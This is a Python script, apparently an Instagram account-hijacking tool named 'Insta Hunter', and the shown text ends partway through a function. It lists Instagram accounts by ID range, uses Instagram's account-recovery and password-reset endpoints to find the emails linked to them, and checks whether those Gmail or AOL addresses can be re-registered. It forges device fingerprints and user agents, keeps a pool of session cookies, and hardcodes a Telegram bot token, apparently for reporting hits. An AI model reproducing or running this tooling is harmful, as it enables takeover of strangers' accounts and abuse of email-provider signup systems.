import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
import base64
import secrets
import threading
import pickle
from itertools import cycle
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor
import requests
import httpx
import urllib.parse
from colorama import Fore, Style, init
init(autoreset=True)
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
M = Fore.MAGENTA
RESET = Style.RESET_ALL
from cfonts import render as n

# ════ HARDCODED CONFIG (NO INPUTS NEEDED) ════
BOT_TOKEN = "8760884392:AAGkMf1Z6DRjrs-nuUrsWWBJMo6tzOOIhaQ"
CHAT_ID = "8598993143"
MIN_FOLLOWERS = 0

theme_colors = [['magenta', 'cyan']]

print(f"""
\033[38;5;213m◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
┃      ✦  𝗔𝗗𝗜𝗧𝗬𝗔 𝗜𝗡𝗦𝗧𝗔 𝗛𝗨𝗡𝗧𝗘𝗥 ✦      ┃
◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢\033[0m

\033[96m◈ 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓    ─►   \033[𝗔𝗗𝗜𝗧𝗬𝗔 𝗛𝗨𝗡𝗧 𓆩⃟🏴‍☠️𓆪\033[0m
\033[96m◈ 𝐂ʜᴀɴɴᴇʟ        ─► \033[92mhttps://t.me/team_kryzen | 𝗔𝗗𝗜𝗧𝗬𝗔 𝗛𝗨𝗡𝗧\033[0m

\033[38;5;213m◈━━━━━━━━━━━━━━━━━━━━━━━━◈\033[0m""")

def generate_android_id() -> str:
    return "android-" + ''.join(random.choices(string.hexdigits.lower(), k=16))

def generate_device_id() -> str:
    return "android-" + ''.join(random.choices(string.hexdigits.lower(), k=16))

def generate_waterfall_id() -> str:
    return str(uuid.uuid4())

def random_ua() -> str:
    os_versions = ['28/9', '29/10', '30/11', '31/12', '32/13', '33/14']
    dpis = ['320dpi', '420dpi', '480dpi', '560dpi']
    res = ['720x1280', '1080x1920', '1440x2560', '1080x2340']
    brands = ['samsung', 'xiaomi', 'oneplus', 'google', 'oppo', 'vivo', 'realme']
    return (f"Instagram {random.randint(200, 400)}.0.0.{random.randint(10, 99)}.{random.randint(10, 999)} "
            f"Android ({random.choice(os_versions)}; {random.choice(dpis)}; {random.choice(res)}; "
            f"{random.choice(brands)}; en_US; {random.randint(100000000, 999999999)})")

def random_web_ua() -> str:
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"

CONFIG = {
    "insta_graphql": "https://www.instagram.com/api/graphql",
    "google_url": "https://accounts.google.com",
    "form_type": "application/x-www-form-urlencoded; charset=UTF-8",
    "token_file": "gmail_token.txt",
    "output_file": "#ADITYA_HUNT_Hits.txt",
    "domains": ["@gmail.com", "@aol.com"],
    "id_ranges": []
}

ALL_YEAR_RANGES = [
    (1, 5000000, 2010),
    (5000001, 17750000, 2011),
    (17750001, 279760000, 2012),
    (279760001, 900990000, 2013),
    (900990001, 1629010000, 2014),
    (1629010001, 2369359761, 2015),
    (2369359762, 4239516754, 2016),
    (4239516755, 6345108209, 2017),
    (6345108210, 10016232395, 2018),
    (10016232396, 27238602159, 2019),
    (27238602160, 43464475395, 2020),
    (43464475395, 50289297647, 2021),
    (50289297647, 57464707082, 2022),
    (57464707082, 63313426938, 2023),
    (63313426938, 70134323896, 2024),
    (70313426938, 78313496938, 2025)
]

USER_AGENTS = [
    "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; samsung; SM-S911B; dm1q; qcom; en_US; 475223914)",
    "Instagram 319.0.0.30.121 Android (32/12; 440dpi; 1080x2340; samsung; SM-M336B; m33x; exynos1280; en_US; 471823650)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2340; samsung; SM-M526BR; m52x; qcom; en_US; 483662991)",
    "Instagram 322.0.0.45.112 Android (34/14; 420dpi; 1080x2400; samsung; SM-G998B; dm2q; qcom; en_US; 498112345)",
    "Instagram 318.0.0.22.110 Android (30/11; 400dpi; 1080x2310; samsung; SM-A105F; a10; exynos7884; en_US; 439100111)",
    "Instagram 319.0.0.30.121 Android (31/12; 440dpi; 1080x2400; xiaomi; M2101K6G; sweet; qcom; en_GB; 454782345)",
    "Instagram 321.0.0.28.120 Android (33/13; 440dpi; 1080x2400; xiaomi; 2211133G; ruby; mt6983; en_US; 467882419)",
    "Instagram 320.0.0.34.109 Android (33/13; 400dpi; 1080x2400; xiaomi; 2201117TY; veux; qcom; en_US; 487266531)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1080x2400; xiaomi; Mi 11; venus; qcom; en_US; 499111222)",
    "Instagram 318.0.0.22.110 Android (29/10; 320dpi; 720x1280; xiaomi; Redmi Note 9; merlin; mt6768; en_US; 431200333)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1240x2772; OnePlus; CPH2449; ONEPLUS11; qcom; en_US; 489234551)",
    "Instagram 319.0.0.30.121 Android (32/12; 480dpi; 1080x2412; OnePlus; CPH2413; NE2213; qcom; en_GB; 453228190)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; OnePlus; LE2117; OnePlus9; qcom; en_US; 479555666)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2400; OnePlus; IN2017; OnePlus8T; qcom; en_US; 444777888)",
    "Instagram 322.0.0.45.112 Android (34/14; 420dpi; 1080x2400; google; Pixel 7; panther; gs201; en_US; 493245782)",
    "Instagram 321.0.0.28.120 Android (33/13; 480dpi; 1080x2400; google; Pixel 6; oriole; gs101; en_US; 476111333)",
    "Instagram 320.0.0.34.109 Android (33/13; 400dpi; 1080x2340; google; Pixel 5; redfin; sm7250; en_US; 465888999)",
    "Instagram 319.0.0.30.121 Android (31/12; 420dpi; 1080x2400; oppo; CPH2457; PHB110; mt6895; en_US; 462775910)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; oppo; CPH2371; chopin; mt6833; en_GB; 469800111)",
    "Instagram 318.0.0.22.110 Android (29/10; 320dpi; 720x1280; oppo; CPH1909; CPH1909; mt6762; en_US; 439222444)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; vivo; V2145; PD2145; mt6893; en_US; 478932112)",
    "Instagram 319.0.0.30.121 Android (32/12; 480dpi; 1080x2400; vivo; V2072A; PD2072; qcom; en_US; 471555777)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2400; vivo; V2036; PD2036; mt6768; en_GB; 452333555)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2400; realme; RMX3311; serpent; qcom; en_US; 442119875)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; realme; RMX3710; halo; mt6833; en_GB; 469862234)",
    "Instagram 320.0.0.34.109 Android (33/13; 400dpi; 1080x2400; realme; RMX3396; RE58B2; qcom; en_US; 475222444)",
    "Instagram 318.0.0.22.110 Android (29/10; 400dpi; 1080x2310; HUAWEI; ELE-L29; hwELE; kirin980; en_GB; 439875334)",
    "Instagram 319.0.0.30.121 Android (31/12; 480dpi; 1080x2400; HUAWEI; CET-AL00; cetus; kirin9000; en_US; 467333555)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2376; honor; FNE-NX9; fne; kirin9000; en_GB; 431597221)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; honor; ANY-NX1; any; qcom; en_US; 483111222)",
    "Instagram 322.0.0.45.112 Android (34/14; 440dpi; 1080x2400; motorola; XT2303-2; crosby; qcom; en_US; 492874115)",
    "Instagram 321.0.0.28.120 Android (33/13; 480dpi; 1080x2400; motorola; XT2127-1; nio; qcom; en_US; 479555333)",
    "Instagram 322.0.0.45.112 Android (34/14; 400dpi; 1080x2400; sony; XQ-CT72; pdx234; qcom; en_US; 498722341)",
    "Instagram 319.0.0.30.121 Android (31/12; 480dpi; 1080x2400; sony; XQ-AT52; pdx203; qcom; en_US; 466111444)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1440x3120; lg; LM-V600; judyln; qcom; en_US; 499178234)",
    "Instagram 318.0.0.22.110 Android (29/10; 420dpi; 1080x2400; lg; LM-G710; judyln; qcom; en_US; 438999111)",
]

WEB_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7827.197 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
]

class StatsManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.hits = 0
        self.good_insta = 0
        self.bad_insta = 0
        self.bad_email = 0
        self.taken = 0
        self.limit = 0
        self.follower_0_50 = 0
        self.follower_50_250 = 0
        self.follower_250_plus = 0
        self.total = 0

    def increment(self, attr: str, delta: int = 1):
        with self.lock:
            setattr(self, attr, getattr(self, attr) + delta)

    def snapshot(self):
        with self.lock:
            return (self.hits, self.good_insta, self.bad_insta,
                    self.bad_email, self.taken, self.limit)

stats = StatsManager()

SESSION_FILE = "instagram_sessions.pkl"
session_pool_lock = threading.Lock()
session_pool = []

DEVICE_IDS = [
    "android-8a1c3f9b5e2d4c7a",
    "android-b2d5e4c8f7a3d9b1",
    "android-c3e6f5d9a8b4c2e0",
    "android-d4f7a6e0b9c5d3f1",
    "android-e5a8b7f1c0d6e4a2",
    "android-f6b9c8a1d2e3f4a5",
    "android-1a2b3c4d5e6f7a8b",
]

def load_session_pool():
    global session_pool
    try:
        if os.path.exists(SESSION_FILE):
            with open(SESSION_FILE, 'rb') as f:
                data = pickle.load(f)
                working = data.get('working', {})
                session_pool = list(working.values())
    except:
        session_pool = []

def save_session_to_pool(session_data):
    global session_pool
    if not session_data or 'session_id' not in session_data:
        return
    with session_pool_lock:
        session_pool.append(session_data)
        try:
            existing_data = {}
            if os.path.exists(SESSION_FILE):
                with open(SESSION_FILE, 'rb') as f:
                    existing_data = pickle.load(f)
            working = existing_data.get('working', {})
            working[session_data['session_id']] = session_data
            with open(SESSION_FILE, 'wb') as f:
                pickle.dump({
                    'working': working,
                    'not_working': existing_data.get('not_working', {}),
                    'timestamp': datetime.now().isoformat()
                }, f)
        except:
            pass

def get_session_from_pool():
    with session_pool_lock:
        if session_pool:
            return random.choice(session_pool)
    return None

class InstaClient:
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = None
        self.session_data = {}
        self.session_loaded = False
        self.device_id_cycle = cycle(DEVICE_IDS)

        pool_session = get_session_from_pool()
        if pool_session:
            try:
                if 'headers' in pool_session:
                    self.session.headers.update(pool_session['headers'])
                if 'cookies' in pool_session:
                    for cookie in pool_session['cookies']:
                        self.session.cookies.set(**cookie)
                if 'csrf_token' in pool_session:
                    self.csrf_token = pool_session['csrf_token']
                    self.session.headers["X-CSRFToken"] = self.csrf_token
                self.session_loaded = True
            except:
                pass

        if not self.session_loaded:
            self.session.headers.update({
                "User-Agent": random.choice(USER_AGENTS),
                'X-IG-App-Startup-Country': 'US',
                'X-Bloks-Version-Id': 'ce555e5500576acd8e84a66018f54a05720f2dce29f0bb5a1f97f0c10d6fac48',
                'X-IG-App-ID': random.choice(["567067343352427", "124024574287414"]),
                'X-IG-Connection-Type': random.choice(["WIFI", "MOBILE"]),
                'X-IG-Device-ID': next(self.device_id_cycle),
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                'accept-encoding': 'gzip, deflate',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                "Connection": "keep-alive",
                "Origin": "https://www.instagram.com",
                "Referer": "https://www.instagram.com/",
                "sec-ch-ua": '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            })

    def get_csrf(self, text: str):
        patterns = [
            r'"csrf_token":"(.*?)"',
            r'csrftoken=([a-zA-Z0-9]+)',
        ]
        for p in patterns:
            m = re.search(p, text)
            if m:
                self.csrf_token = m.group(1)
                self.session.headers["X-CSRFToken"] = self.csrf_token
                return self.csrf_token
        return None

    def visit_page(self, url: str):
        try:
            r = self.session.get(url)
            if r.status_code == 200:
                self.get_csrf(r.text)
            return r
        except:
            return None

    def send_recovery(self, url: str, data=None, extra_headers=None):
        headers = self.session.headers.copy()
        if extra_headers:
            headers.update(extra_headers)
        try:
            r = self.session.post(url, data=data, headers=headers)
            try:
                js = r.json()
                if js.get("status") == "ok":
                    try:
                        session_id = f"session_{hash(self.csrf_token) if self.csrf_token else random.randint(1000, 9999)}"
                        self.session_data = {
                            'session_id': session_id,
                            'headers': dict(self.session.headers),
                            'cookies': [
                                {'name': cookie.name, 'value': cookie.value, 'domain': cookie.domain, 'path': cookie.path}
                                for cookie in self.session.cookies
                            ],
                            'csrf_token': self.csrf_token,
                            'timestamp': datetime.now().isoformat()
                        }
                        save_session_to_pool(self.session_data)
                    except:
                        pass
                    return True, js
                else:
                    return False, None
            except:
                return False, None
        except:
            return False, None

def generate_google_token() -> bool:
    for attempt in range(3):
        try:
            alphabet = 'abcdefghijklmnopqrstuvwxyz'
            n1 = ''.join(random.choices(alphabet, k=random.randint(6, 9)))
            n2 = ''.join(random.choices(alphabet, k=random.randint(3, 9)))
            host = ''.join(random.choices(alphabet, k=random.randint(15, 30)))
            headers = {
                'accept': '*/*',
                'accept-language': 'en-GB,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'user-agent': random_web_ua(),
                'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }
            r = requests.get(
                f"{CONFIG['google_url']}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB",
                headers=headers, timeout=15
            )
            if r.status_code != 200:
                continue
            tok = re.search(
                r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                r.text
            )
            if not tok:
                continue
            tl = tok.group(2)
            cookies = {'__Host-GAPS': host}
            headers.update({
                'authority': 'accounts.google.com',
                'origin': CONFIG['google_url'],
                'referer': f'{CONFIG["google_url"]}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            })
            data = {
                'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
            }
            r2 = requests.post(
                f"{CONFIG['google_url']}/_/signup/validatepersonaldetails",
                cookies=cookies, headers=headers, data=data, timeout=15
            )
            if '",null,"' in r2.text:
                tl = r2.text.split('",null,"')[1].split('"')[0]
            host = r2.cookies.get('__Host-GAPS', host)
            with open(CONFIG['token_file'], 'w') as f:
                f.write(f"{tl}//{host}\n")
            return True
        except Exception:
            continue

    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': random_web_ua(),
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-same-domain': '1',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'hl': 'en'
        }
        fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
        response = requests.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params, headers=headers, data=data, timeout=15
        )
        tl_match = re.search(r'"TL:([^"]+)"', response.text)
        if tl_match:
            tl = tl_match.group(1)
            host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
            with open(CONFIG['token_file'], 'w') as f:
                f.write(f"{tl}//{host}\n")
            return True
    except Exception:
        pass
    return False

def lookup(email: str) -> bool:
    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    device = generate_device_id()
    family = str(uuid.uuid4())
    android = generate_android_id()
    waterfall = generate_waterfall_id()

    payload = {
        'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ waterfall +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
        'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
    }
    headers = {
        'User-Agent': random_ua(),
        'accept-language': "en-IN, en-US",
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        'x-ig-android-id': android,
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_IN",
        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': str(time.time()),
        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
        'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
    }

    try:
        resp = requests.post(url, data=payload, headers=headers, timeout=20)
        if f"{email}" in resp.text:
            stats.increment('good_insta')
            return True
        else:
            stats.increment('bad_insta')
            return False
    except Exception:
        stats.increment('bad_insta')
        return False
        
def check_gmail_availability(email: str, session: requests.Session) -> bool:
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(CONFIG['token_file'], 'r') as f:
            line = f.read().splitlines()[0]
            tl, host = line.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': CONFIG['form_type'],
            'google-accounts-xsrf': '1',
            'origin': CONFIG['google_url'],
            'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            'user-agent': random.choice(USER_AGENTS)
        }
        params = {'TL': tl}
        data = (
            f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
            f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
            "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
            "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
            "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
            "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
        )
        resp = session.post(
            f"{CONFIG['google_url']}/_/signup/usernameavailability",
            params=params, cookies=cookies, headers=headers, data=data,
            timeout=10
        )
        if '"gf.uar",1' in resp.text:
            return True
        else:
            stats.increment('bad_email')
            return False
    except Exception:
        stats.increment('bad_email')
        return False

def check_aol_availability(email: str, session: requests.Session) -> bool:
    username = email.split('@')[0]
    try:
        time.sleep(random.uniform(0.3, 1.0))
        s = requests.Session()

        headers = {
            'authority': 'login.aol.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'user-agent': random.choice(WEB_USER_AGENTS),
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        create_url = (
            'https://login.aol.com/account/create?specId=yidregsimplified&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3F'
            'activity%3Dheader-signin%26client_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26language%3Dtr-TR%26nonce%3DespCiEVdB33iuFGue3kB74NAbyy3wQWj%26pspid%3D1197806870%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2520ycal-w%2520openid%2520openid2%2520mail-w%2520mail-x%2520sdps-r%2520msgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tL2QifQ.JMX40ZssLtCMlaqAOZYFU6Tz6rggXd8IYA-lVO2jkmWcFPGEJ3tTkOj7qGkKjtTLXofPUFFQ6Uzih1pYCkh_fgS1zD8X5Ge3c0oSKTchP4AdNmsEetEyDMoUijvOWJVVbDe0byUHYQzCmE7F-o2187M5fpzxgGEV6U-7Xm4ywaA'
        )
        r1 = s.get(create_url, headers=headers)
        if r1.status_code != 200:
            stats.increment('bad_email')
            return False

        specId_match = re.search(r'name="specId"\s+value="([^"]+)"', r1.text)
        acrumb_match = re.search(r'name="acrumb"\s+value="([^"]+)"', r1.text)
        sessionIndex_match = re.search(r'name="sessionIndex"\s+value="([^"]+)"', r1.text)

        if not all([specId_match, acrumb_match, sessionIndex_match]):
            stats.increment('bad_email')
            return False

        specId = specId_match.group(1)
        acrumb = acrumb_match.group(1)
        sessionIndex = sessionIndex_match.group(1)

        validate_url = (
            f'https://login.aol.com/account/create/validate?specId={specId}&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3F'
            'activity%3Dheader-signin%26client_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26language%3Dtr-TR%26nonce%3DespCiEVdB33iuFGue3kB74NAbyy3wQWj%26pspid%3D1197806870%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2520ycal-w%2520openid%2520openid2%2520mail-w%2520mail-x%2520sdps-r%2520msgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tL2QifQ.JMX40ZssLtCMlaqAOZYFU6Tz6rggXd8IYA-lVO2jkmWcFPGEJ3tTkOj7qGkKjtTLXofPUFFQ6Uzih1pYCkh_fgS1zD8X5Ge3c0oSKTchP4AdNmsEetEyDMoUijvOWJVVbDe0byUHYQzCmE7F-o2187M5fpzxgGEV6U-7Xm4ywaA'
        )

        data = {
            'specId': specId,
            'acrumb': acrumb,
            'sessionIndex': sessionIndex,
            'userId': username,
            'validateField': 'userId'
        }
        headers2 = {
            'authority': 'login.aol.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.aol.com',
            'referer': create_url,
            'user-agent': random.choice(WEB_USER_AGENTS),
            'x-requested-with': 'XMLHttpRequest',
        }

        r2 = s.post(validate_url, headers=headers2, data=data)

        if r2.status_code == 200:
            try:
                json_resp = r2.json()
                userId_field = json_resp.get('fields', {}).get('userId', {})
                if 'error' not in userId_field:
                    return True
                else:
                    error_id = userId_field.get('error', {}).get('id')
                    if error_id in ["IDENTIFIER_EXISTS", "IDENTIFIER_NOT_AVAILABLE", "RESERVED_WORD_PRESENT"]:
                        stats.increment('bad_email')
                        return False
                    else:
                        stats.increment('bad_email')
                        return False
            except Exception:
                resp_text = r2.text
                if 'IDENTIFIER_AVAILABLE' in resp_text or '"errors":[]' in resp_text:
                    return True
                else:
                    stats.increment('bad_email')
                    return False
        else:
            stats.increment('bad_email')
            return False
    except Exception:
        stats.increment('bad_email')
        return False

_RESET_BASE_URL = "https://www.instagram.com"
_RESET_RESET_URL = "https://www.instagram.com/accounts/password/reset/"
_RESET_AJAX_URL = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
_RESET_UA_WEB = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
_RESET_UA_APP = "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; tr_TR; 465123678)"

def fetch_reset_email(username: str) -> str:
    max_retries = 2
    for attempt in range(max_retries):
        try:
            client = httpx.Client(http2=True, follow_redirects=True)
            try:
                r0 = client.get(_RESET_BASE_URL, headers={
                    "User-Agent": _RESET_UA_WEB,
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
                    "Accept-Language": "tr-TR,tr;q=0.9",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                })
            except Exception:
                client.close()
                if attempt < max_retries - 1:
                    continue
                return "-"
            csrf = ""
            for c in client.cookies.jar:
                if c.name == "csrftoken":
                    csrf = c.value
                    break
            if not csrf:
                client.close()
                if attempt < max_retries - 1:
                    continue
                return "-"
            headers = {
                "User-Agent": _RESET_UA_APP,
                "Accept": "*/*",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": _RESET_BASE_URL,
                "Referer": _RESET_RESET_URL,
                "X-CSRFToken": csrf,
                "X-IG-App-ID": "936619743392459",
                "X-Requested-With": "XMLHttpRequest",
                "X-Instagram-AJAX": "1",
                "X-ASBD-ID": "129477",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
